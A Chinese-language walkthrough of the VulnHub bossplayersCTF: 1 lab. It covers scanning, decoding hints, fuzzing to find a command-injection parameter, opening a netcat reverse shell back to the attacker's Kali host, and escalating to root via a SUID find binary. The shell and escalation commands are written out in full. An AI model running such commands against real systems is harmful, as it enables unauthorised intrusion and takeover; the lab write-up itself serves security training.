---
title: bossplayersCTF-1
author: Creexile
date: 2025-01-06 20:24:08
lastMod: 2025-01-08
summary: 'easyNo.6'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [RCE, 爆破, 提权, 渗透]
---

# bossplayersCTF: 1

---

easyNo.6

> 来源: [vulnhub靶场-bossplayersCTF: 1](https://www.vulnhub.com/entry/bossplayersctf-1,375/)
>
> 目标: root
>
> 描述: Aimed at Beginner Security Professionals who want to get their feet wet into doing some CTF's.
>
> 妙妙工具: `python -c 'import pty; pty.spawn("/bin/bash")'`

## 环境配置

- kali: 192.168.56.5
- target: 192.168.56.19

## 信息收集

nmap进行主机发现和端口/服务扫描

```
nmap -sS 192.168.56.0/24
nmap -A 192.168.56.19

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

访问80端口, 发现是一些描述, 说请你访问sudocuong.com, 其实没有东西;

查看网页源码, 发现最下面有一行注释:

```
WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK
```

这是连续三个base64, 解码得到`workinginprogress.php`

目录扫描发现robots.txt, 里面是不知道谁的"密码", 解码后看来是没用的东西

```
super secret password - bG9sIHRyeSBoYXJkZXIgYnJvCg==
解码: lol try harder bro
```

访问`workinginprogress.php`

```
System Install:
Linux Debian - [*]
APACHE2 - [*]
PHP - [*]

Outstanding:
Test ping command - [ ]
Fix Privilege Escalation - [ ]
Completed:

Say Hi to Haley - [*]
```

这里似乎是一个展示了安装和实现了什么的界面; 既然这个界面存在, 那肯定有存在的理由

一般能在php文件上使用的方法, 是RCE, 文件包含, 文件上传, 反序列化; 这里可能存在的只能是RCE和文件包含, 我们不知道传参名是什么?那就模糊测试(跑字典)

[实战沉淀字典](https://github.com/SexyBeast233/SecDictionary)

利用bp的Intruder模块, 结合参数字典中的关键词字典进行爆破

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250106163113.png)

都测试一遍后发现是RCE, 参数为cmd, 没有过滤

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250106172300.png)

> 虚拟机跑字典实在是太慢了, 我建议将网络配置成物理机可以访问的再去爆

## getshell

其实已经是了, 反弹出来罢了

```
# kali
nc -lvnp 6666

# target
?cmd=nc -e /bin/bash 192.168.56.5 6666
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250106172621.png)

## 信息收集

```bash
# 系统信息 Linux bossplayers 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64 GNU/Linux
uname -a
# 内核版本 4.19.0-6-amd64
uname -r
# 查看环境
python -h
nc -h
# 查看特权文件, find有特权, 那就利用find提权
find / -perm -4000 2>/dev/null
```

## 提权

执行命令

```bash
find . -exec /bin/sh -p \; -quit
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250106173538.png)

flag在root下的root.txt中, 解码后为congratulations

```bash
Y29uZ3JhdHVsYXRpb25zCg==
# congratulations
```
